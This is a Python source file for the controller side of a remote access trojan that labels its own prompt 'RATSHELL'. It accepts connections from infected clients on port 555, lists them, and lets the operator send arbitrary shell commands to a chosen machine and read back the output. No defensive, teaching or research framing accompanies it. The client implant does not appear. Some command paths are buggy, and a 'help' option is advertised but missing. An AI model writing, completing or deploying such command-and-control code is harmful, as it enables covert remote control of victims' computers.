import socket             
import threading

PORT = 555  




class Server:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
        self.s.bind(('', PORT))         
        self.s.listen(5)     
        self.clients=[]
        
    def accept_clients(self):
        while True: 

            c, addr = self.s.accept()  
            if (c,addr) not in self.clients:
                self.clients.append((c,addr))
            
    def list_clients(self):
        print(self.clients)

def main():
    server=Server()
    
    accept=threading.Thread(target=server.accept_clients)

    accept.start()

    while True:
        
        server_cm=input("RATSHELL$>")
        server_cm=server_cm.split(" ")
        if server_cm[0]=="LC" and len(server_cm)==1:
            server.list_clients()
        elif server_cm[0] == "EXIT" and len(server_cm)==1:
            accept.join()
            break
            
        elif server_cm[0]=="CLIENT" and len(server_cm)==2:
            try:
                cl=server.clients[int(server_cm[1])]
                while True:
                    cm=input("RATSHELL_"+str(cl[1])+"_$>")
                    cl[0].send(cm.encode())
                    if cm=="destroy":
                        server.clients.remove(cl)
                        cl[0].close()
                       
                    elif cm=="back":
                        break
                    elif cm=="exit":
                        server.clients.remove(cl)
                        break
                    res=cl[0].recv(8192).decode()
                    print(res)


            except:
                print("client not exists")
        else:
            print("unknown command type help for help")
      
main()